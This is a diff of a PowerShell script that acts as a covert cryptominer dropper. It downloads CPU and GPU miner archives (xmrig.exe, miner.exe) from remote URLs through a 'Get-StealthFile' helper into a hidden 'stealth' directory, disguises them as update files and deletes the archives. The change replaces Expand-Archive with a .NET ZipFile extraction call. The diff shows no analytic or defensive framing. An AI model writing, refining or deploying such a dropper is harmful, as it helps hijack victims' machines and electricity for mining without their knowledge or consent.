@@ -43,6 +43,7 @@ try {
     }
 } catch { }
 
+Add-Type -AssemblyName System.IO.Compression.FileSystem
 $CpuZip = Join-Path $StealthDir "upd_c.zip"
 $GpuZip = Join-Path $StealthDir "upd_g.zip"
 $CpuExe = Join-Path $StealthDir $Name1
@@ -50,7 +51,7 @@ $GpuExe = Join-Path $StealthDir $Name2
 
 if (-not (Test-Path $CpuExe)) {
     if (Get-StealthFile $MinerUrl $CpuZip) {
-        Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($CpuZip, $StealthDir)
         Remove-Item $CpuZip -Force -ErrorAction SilentlyContinue
         $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
         if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
@@ -71,7 +72,7 @@ try {
 
 if ($GpuDetected -and -not (Test-Path $GpuExe)) {
     if (Get-StealthFile $GpuMinerUrl $GpuZip) {
-        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($GpuZip, $StealthDir)
         Remove-Item $GpuZip -Force -ErrorAction SilentlyContinue
         $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
         if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
